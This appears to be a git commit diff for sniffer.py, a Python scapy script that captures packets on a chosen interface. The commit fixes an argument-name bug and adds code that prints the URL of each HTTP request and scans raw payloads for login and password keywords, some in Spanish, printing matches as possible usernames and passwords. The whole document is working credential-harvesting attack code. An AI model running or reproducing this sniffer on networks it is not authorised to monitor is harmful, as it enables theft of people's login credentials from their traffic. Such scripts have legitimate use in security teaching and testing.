d1a6a21fce375ad25d8f6ff591541e182dcee3ee
root <root@localhost.localdomain>
2019-10-31 10:18:32 -0500

    actualizacion

--- sniffer.py
+++ sniffer.py
@@ -7,7 +7,7 @@ def get_interface():
     parser.add_argument('-i','--interface', dest="Interface", help="Specify an interface to capture packets from")
     options = parser.parse_args()
     
-    if not  options.interface:
+    if not  options.Interface:
         parser.error('[-] please specify a value for the interface, enter --help for more info')
     
     return options
@@ -17,8 +17,26 @@ def sniff(interface):
 
 def process_sniffed_packet(packet):
     if packet.haslayer(http.HTTPRequest):
-        print(packet.show())
+        # print(packet.show())
+        url = geturl(packet)
+        print("[+] HTTP Request > " +url)
+        logininfo = get_logininfo(packet)
+
+        if logininfo:
+            print ('\n [+] Possible username and password '+logininfo+'\n')
+
+def geturl(packet):
+    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+
+def get_logininfo(packet):
+    if packet.haslayer(scapy.Raw):
+        load = packet[scapy.Raw].load
+        keywords = ['login','LOGIN','Login','Iniciar Sesion','inicio de sesion', 'iniciar sesion', 'username','user','pass', 'password']
+
+        for keyword in keywords:
+            if keyword in load:
+                return load
 
 
 options = get_interface()
-sniff(options.interface)
+sniff(options.Interface)
